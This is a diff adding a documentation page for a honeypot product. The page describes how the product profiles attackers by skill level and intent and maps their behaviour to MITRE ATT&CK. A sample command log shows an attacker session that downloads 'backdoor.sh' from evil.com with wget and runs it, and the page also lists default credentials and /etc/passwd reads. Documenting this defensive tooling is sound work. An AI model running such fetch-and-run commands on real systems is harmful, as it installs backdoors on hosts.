@@ -1,0 +1,179 @@
+---
+title: "Attacker Profiling"
+description: "How Panguard Trap classifies attacker skill level, analyzes intent, and maps behavior to MITRE ATT&CK."
+icon: "fingerprint"
+---
+
+Panguard Trap does not just log connections -- it builds behavioral profiles of every attacker that interacts with your honeypots. Each profile includes a skill level classification, intent analysis, and mapping to MITRE ATT&CK techniques.
+
+## Skill Level Classification
+
+Trap classifies attackers into three tiers based on observed behavior:
+
+### Script Kiddie
+
+| Indicator | Example |
+|-----------|---------|
+| Uses publicly available tools without modification | Running Hydra with default wordlists |
+| Tries only default credentials | `admin/admin`, `root/password`, `root/123456` |
+| No post-exploitation activity | Disconnects after successful login |
+| High volume, low sophistication | Hundreds of login attempts with common passwords |
+
+### Advanced
+
+| Indicator | Example |
+|-----------|---------|
+| Modifies tool parameters | Custom wordlists, adjusted scan timing |
+| Attempts multiple exploit types | Tries SSH, then HTTP, then MySQL |
+| Basic post-exploitation | Runs `uname -a`, `cat /etc/passwd`, checks for other hosts |
+| Internal network scanning | Probes RFC 1918 addresses after gaining access |
+
+### APT (Advanced Persistent Threat)
+
+| Indicator | Example |
+|-----------|---------|
+| Custom payloads | Non-standard exploit code, compiled binaries |
+| Low and slow approach | Few connections over extended time periods |
+| Persistence establishment | Installs cron jobs, modifies SSH keys, plants backdoors |
+| Targeted behavior | Searches for specific files, databases, or configurations |
+| Anti-forensics | Clears logs, modifies timestamps |
+
+### Classification Signals
+
+<AccordionGroup>
+  <Accordion title="Credential Analysis">
+    - **Default credentials** (admin/admin, root/root): Script Kiddie
+    - **Credential lists** (sequential attempts from known wordlists): Script Kiddie to Advanced
+    - **Targeted credentials** (organization-specific usernames, previously breached passwords): Advanced to APT
+  </Accordion>
+  <Accordion title="Command Sophistication">
+    - **Single commands** (whoami, id, uname -a): Script Kiddie
+    - **Chained commands** (enumeration scripts, privilege escalation attempts): Advanced
+    - **Custom tooling** (obfuscated scripts, memory-resident payloads, anti-detection): APT
+  </Accordion>
+  <Accordion title="Behavioral Patterns">
+    - **Fast and noisy** (rapid connection attempts, no pauses): Script Kiddie
+    - **Moderate pacing** (delays between attempts, some adaptation): Advanced
+    - **Slow and deliberate** (long dwell time, careful enumeration, anti-forensics): APT
+  </Accordion>
+</AccordionGroup>
+
+## Intent Analysis
+
+Trap analyzes behavioral patterns to classify attacker intent into 6 categories:
+
+| Intent | Indicators | MITRE Tactic |
+|--------|------------|--------------|
+| **Reconnaissance** | Port scanning, service enumeration, OS fingerprinting | TA0043 |
+| **Brute Force** | High-volume credential attempts, dictionary attacks | TA0006 |
+| **Exploitation** | Known CVE payloads, buffer overflow attempts, injection attacks | TA0001 |
+| **Lateral Movement** | Internal network scanning, SMB enumeration, SSH pivoting | TA0008 |
+| **Data Exfiltration** | File download commands, data encoding, outbound transfers | TA0010 |
+| **Persistence** | Cron job creation, SSH key modification, backdoor installation | TA0003 |
+
+## MITRE ATT&CK Mapping
+
+Every attacker action is mapped to the relevant MITRE ATT&CK technique:
+
+| Observed Behavior | Technique ID | Technique Name |
+|-------------------|-------------|----------------|
+| SSH password guessing | T1110.001 | Password Guessing |
+| Credential stuffing | T1110.004 | Credential Stuffing |
+| Web shell upload | T1505.003 | Web Shell |
+| `cat /etc/passwd` | T1087.001 | Local Account Discovery |
+| Internal port scan | T1046 | Network Service Scanning |
+| Cron job creation | T1053.003 | Cron |
+| SSH key modification | T1098.004 | SSH Authorized Keys |
+| wget/curl download | T1105 | Ingress Tool Transfer |
+
+## Profile Report
+
+View attacker profiles via the CLI:
+
+```bash
+panguard trap profiles
+```
+
+```
+── Attacker Profiles ──────────────────
+
+Attacker #1: 203.0.113.50
+  Level:     Script Kiddie
+  Intent:    Brute Force
+  Sessions:  47
+  Duration:  2h 15m
+  Creds:     admin/admin, root/123456 (12 attempts)
+  Tools:     hydra 9.4
+  MITRE:     T1110.001 (Password Guessing)
+
+Attacker #2: 198.51.100.23
+  Level:     Advanced
+  Intent:    Reconnaissance -> Exploitation
+  Sessions:  3
+  Duration:  45m
+  Commands:  uname -a, cat /etc/passwd, wget http://...
+  Tools:     Custom scripts
+  MITRE:     T1046, T1087.001, T1105
+```
+
+## Collected Intelligence
+
+### Credential Database
+
+All attempted username/password combinations are recorded:
+
+```
+── Captured Credentials ───────────────
+
+SSH:
+  root / password       (847 attempts)
+  admin / admin         (234 attempts)
+  root / 123456         (156 attempts)
+  ubuntu / ubuntu       (89 attempts)
+```
+
+### Command Logs
+
+Every command executed in a honeypot session is logged with timestamps:
+
+```
+── Command Log ────────────────────────
+
+Session: 203.0.113.50 @ 2025-01-15 14:23
+  $ uname -a
+  $ cat /etc/passwd
+  $ wget http://evil.com/backdoor.sh
+  $ chmod +x backdoor.sh
+  $ ./backdoor.sh
+```
+
+## Intelligence Flow
+
+```
+Honeypot Session
+      |
+      v
+Behavioral Analysis ──> Skill Classification
+      |                        |
+      v                        v
+Intent Classification    MITRE Mapping
+      |                        |
+      v                        v
+Guard Block List    Threat Cloud Upload
+```
+
+## Threat Cloud Integration
+
+Attacker profiles are anonymized before sharing:
+
+| Data Shared | Anonymization |
+|------------|---------------|
+| Source IP | /16 masked (last two octets zeroed) |
+| Credentials | Hashed (SHA-256), never plaintext |
+| Commands | Sanitized of environment-specific data |
+| Skill classification | Shared as-is |
+| Intent analysis | Shared as-is |
+
+<Info>
+  Attacker profiles persist across sessions. If the same IP returns days later, Trap correlates the new activity with the existing profile and may upgrade the skill level classification based on new evidence. Threat Cloud sharing can be disabled with `--no-cloud` for air-gapped environments.
+</Info>
